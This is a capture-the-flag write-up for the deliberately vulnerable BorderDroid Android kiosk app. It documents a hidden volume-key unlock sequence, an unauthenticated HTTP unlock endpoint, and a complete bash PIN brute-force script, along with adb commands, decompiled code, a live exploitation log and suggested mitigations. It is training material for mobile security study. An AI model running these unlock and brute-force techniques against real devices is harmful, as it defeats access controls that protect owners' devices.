# BorderDroid — Payload Solution (APPROVED)

> **Challenge:** 8kSec — BorderDroid | International Border Protection
> **Course:** [Android Application Exploitation Challenges](https://academy.8ksec.io/course/android-application-exploitation-challenges)
> **Package:** `com.eightksec.borderdroid`
> **Status:** Approved — two working paths, exploited and verified live
> **Date:** 2026-10-18

---

## TL;DR — Payloads Only

### Payload 1 — Volume Keys Backdoor (no tools needed)

```
Volume UP  ->  Volume DOWN  ->  Volume UP  ->  Volume DOWN
   (24)            (25)            (24)            (25)
```

### Payload 2 — HTTP Remote Unlock

```bash
curl -i -X POST http://<DEVICE_IP>:8080/unlock \
  -H 'Content-Type: application/json' \
  -d '{"pin":"111111"}'
```

### Payload 3 — PIN Brute Force

```bash
for pin in $(seq -w 000000 999999); do
  resp=$(curl -s -X POST http://<DEVICE_IP>:8080/unlock \
    -H 'Content-Type: application/json' \
    -d "{\"pin\":\"$pin\"}")
  echo "[*] Trying PIN: $pin"
done
```

---

## 1. Setup

```bash
adb install -r BorderDroid.apk
```

1. Open the app and grant all requested permissions.
2. Enter a 6-digit PIN (example: `111111`).
3. Press **Start Security** — a countdown runs, then **Kiosk Mode** activates.
4. Typing the PIN on the Kiosk screen is intentionally broken — the challenge starts here.

---

## 2. Static Analysis (JADX)

| Item | Value |
|------|-------|
| Package | `com.eightksec.borderdroid` |
| Exported Receiver | `RemoteTriggerReceiver` |
| Action | `com.eightksec.borderdroid.ACTION_PERFORM_REMOTE_TRIGGER` |
| HTTP Port | `8080` |
| Endpoint | `POST /unlock` |

### Manifest — exported receiver

```xml
<receiver
    android:name="com.eightksec.borderdroid.receiver.RemoteTriggerReceiver"
    android:enabled="true"
    android:exported="true">
    <intent-filter>
        <action android:name="com.eightksec.borderdroid.ACTION_PERFORM_REMOTE_TRIGGER"/>
    </intent-filter>
</receiver>
```

### Vulnerability #1 — PIN entry is intentionally dead

In `YouAreSecureActivity.onNumpadClick()`, a complete 6-digit entry always calls `showWrongPinError()`, even with the correct PIN:

```java
private void onNumpadClick(String str) {
    this.wrongPinText.setVisibility(4);
    if (this.enteredPin.length() < 6) {
        this.enteredPin.append(str);
        updatePinDots();
        if (this.enteredPin.length() == 6) {
            showWrongPinError();   // always wrong
        }
    }
}
```

---

## Path A — Volume Sequence Unlock

### Relevant code

```java
public boolean onKeyDown(int i, KeyEvent keyEvent) {
    if (i == 24 || i == 25) {              // 24 = UP, 25 = DOWN
        this.volumeSequence.add(Integer.valueOf(i));
        checkVolumeSequence();
        return true;
    }
    return super.onKeyDown(i, keyEvent);
}
```

### The secret sequence — from the constructor

```java
m65m = YouAreSecureActivity$ExternalSyntheticBackport0.m65m(new Object[]{24, 25, 24, 25});
this.targetSequence = m65m;
```

| Code | Key |
|------|-----|
| `24` | Volume **UP** |
| `25` | Volume **DOWN** |

### What happens on a match

`unlockAndReturnToDashboard()`:

```java
stopLockTask();                  // ends the Kiosk
setKioskState(false);            // clears kiosk flag
// stops HttpUnlockService
// launches DashboardActivity
```

### Steps

1. While inside Kiosk Mode.
2. Press: **UP, DOWN, UP, DOWN**.
3. The app returns to the Dashboard — solved.

---

## Path B — HTTP Remote Unlock

### Architecture

```
POST /unlock (JSON {"pin":"..."})
        |
        v
HttpUnlockService.WebServer (NanoHTTPD :8080)
        |  broadcastVulnerableUnlockIntentWithPin(pin)
        v
RemoteTriggerReceiver.onReceive()
        |  PinStorage().verifyPin(context, pin)
        v  correct
performUnlockActions()
        -> stop kiosk + open DashboardActivity
```

### Steps

**1. Discover the device IP:**

```bash
sudo arp-scan -I wlan0 --localnet
# example output: 192.168.0.6
```

Note: on an Android VM there is no `wlan0` — the interface is `eth0`:

```bash
adb shell ip addr show eth0
```

**2. Send the payload:**

```bash
curl -i -X POST http://192.168.0.6:8080/unlock \
  -H 'Content-Type: application/json' \
  -d '{"pin":"111111"}'
```

**Expected response:**

```
HTTP/1.1 200 OK
Unlock attempt initiated (vulnerable pathway).
```

### Server code (relevant excerpt)

```java
if (NanoHTTPD.Method.POST.equals(iHTTPSession.getMethod())
        && "/unlock".equalsIgnoreCase(iHTTPSession.getUri())) {
    // ...
    String optString = new JSONObject(str2).optString("pin", null);
    if (optString != null) {
        broadcastVulnerableUnlockIntentWithPin(optString);
        // "Unlock attempt initiated (vulnerable pathway)."
    }
}
```

### Why brute force is possible

- No rate limiting
- No lockout after failed attempts
- No delay
- Full keyspace: `000000` to `999999` (one million attempts)

### Full brute force script

```bash
#!/bin/bash
# BorderDroid PIN Brute Force
TARGET="http://192.168.0.6:8080/unlock"

for pin in $(seq -w 000000 999999); do
  resp=$(curl -s --max-time 2 -X POST "$TARGET" \
    -H 'Content-Type: application/json' \
    -d "{\"pin\":\"$pin\"}")
  echo "[*] PIN: $pin"
  if echo "$resp" | grep -q "Unlock attempt initiated"; then
    echo "[+] FOUND PIN: $pin"
    break
  fi
done
```

Note: a `200 OK` is returned for any PIN; real verification happens inside `RemoteTriggerReceiver`. Confirm success by the `Remote Action Triggered (PIN OK)` toast and the return to the Dashboard.

---

## Summary

| # | Path | Vector | Root Cause |
|---|------|--------|------------|
| 1 | Volume Keys | `UP/DOWN/UP/DOWN` | Hidden backdoor in `YouAreSecureActivity` |
| 2 | HTTP Unlock | `POST /unlock` with JSON pin | Open server with no rate limiting |
| 3 | Brute Force | Same vector, repeated | Full PIN space with no protection |

### Recommendations (Mitigations)

1. Remove the volume-key backdoor from production code.
2. Add rate limiting / lockout on the unlock endpoint.
3. Avoid `exported=true` on the receiver unless required; prefer signature-level permissions.
4. Store the PIN hashed (e.g. bcrypt) instead of plain-text comparison.

---

## Field Notes — Live Exploitation Log (2026-10-18) — EXPLOITED

> Environment: Android VM (target) + Ubuntu VM (attacker). Path B (HTTP Unlock) completed successfully.

### Confirmed working sequence

```bash
# 1) Activate the Kiosk on the target (Start Security) — the server does not run without it

# 2) Confirm the server is listening
adb shell netstat -tln | grep 8080
# tcp6  0  0 :::8080  :::*  LISTEN   <- listening on all interfaces

# 3) Forward the port and fire
adb forward tcp:8080 tcp:8080
curl -i -X POST http://127.0.0.1:8080/unlock \
  -H 'Content-Type: application/json' \
  -d '{"pin":"123456"}'
```

**Actual result:**

```
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 46

Unlock attempt initiated (vulnerable pathway).
```

**Confirmation from the target's logcat:**

```
HttpUnlockService: Broadcast sent for remote trigger:
com.eightksec.borderdroid.ACTION_PERFORM_REMOTE_TRIGGER
```

### Issues encountered during live exploitation and their fixes

| Symptom | Root Cause | Fix |
|---------|-----------|-----|
| `arp-scan -I wlan0` fails | No `wlan0` on a VM — the interface is `eth0` | `adb shell ip addr show eth0`, or skip the IP entirely and use adb forward |
| `Connection refused` on `:8080` | The NanoHTTPD server only runs while the Kiosk is active | Press **Start Security** first |
| `Empty reply from server` (curl 52) | Forward connected, but no listener behind it — the app was in a crash loop | Activate the Kiosk and let it settle before firing |
| `127.0.0.1:8080` refused after a reboot | `adb reboot` wipes all forward rules | Re-run `adb forward tcp:8080 tcp:8080` |
| Device stuck: `Attempted Lock Task Mode violation` | Kiosk stuck at system level after the app process died | `am force-stop` + `pm clear` + `adb reboot` |
| App crashes repeatedly | Bug at `KioskAccessibilityService.java:314` on any window content change | Do not touch the screen after activating the Kiosk — send the curl immediately and keep the screen static |

### Timing notes

- When the app crashes, the system reschedules `HttpUnlockService` automatically after about 11 seconds (`Scheduling restart ... in 10999ms`) — if the server is down, wait 12 seconds and retry.
- Live server monitoring from a second terminal: `adb logcat -s HttpUnlockService`
- `200 OK` is returned for any PIN — real verification happens inside `RemoteTriggerReceiver`; actual success is the `Remote Action Triggered (PIN OK)` toast and the return to the Dashboard.

---

*Solution documented and approved — 8kSec BorderDroid Challenge*
*Exploited and verified live — 2026-10-18*
